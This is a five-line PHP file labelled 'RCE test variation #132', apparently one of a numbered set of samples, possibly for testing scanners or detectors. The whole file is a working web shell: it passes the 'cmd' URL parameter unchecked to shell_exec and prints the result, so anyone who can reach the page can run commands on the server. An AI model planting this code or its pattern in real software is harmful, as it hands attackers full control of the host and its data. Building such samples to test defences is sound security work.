<?php
// RCE test variation #132
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>